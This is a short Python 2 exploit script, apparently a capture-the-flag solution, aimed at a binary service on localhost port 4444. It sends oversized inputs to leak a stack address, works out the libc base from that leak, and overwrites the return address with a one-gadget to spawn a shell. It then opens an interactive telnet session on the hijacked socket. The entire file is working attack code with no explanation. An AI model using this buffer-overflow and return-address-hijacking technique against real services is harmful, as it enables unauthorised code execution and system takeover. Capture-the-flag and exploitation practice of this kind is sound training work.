import socket
import struct
import telnetlib
import hexdump

s = socket.create_connection(['localhost',4444])

raw_input('') # for debug
dat = ""
dat += "a"*9
s.send(struct.pack("<Q",0x9))
s.send(dat)
magic_stack = struct.unpack("<Q",(s.recv(1024)[-7:-1]+"\x00\x00"))[0]-0x61-0x2100
libc_base = magic_stack - 0x5e1f00   # if on ctf server, should do bruteforce
magic_gadget = libc_base + 0x4647C 
print "[+]"+hex(magic_stack)
print "[+]"+hex(libc_base)

dat2 = ""
dat2 += "A"*8
dat2 += struct.pack("<Q",magic_stack)
dat2 += struct.pack("<Q",0x4004D4)
s.send(struct.pack("<Q",len(dat2)))
s.send(dat2)

dat3 = ""
dat3 += "A"*16
dat3 += struct.pack("<Q",magic_gadget)
s.send(struct.pack("<Q",len(dat3)))
s.send(dat3)
t = telnetlib.Telnet()
t.sock = s
t.interact()
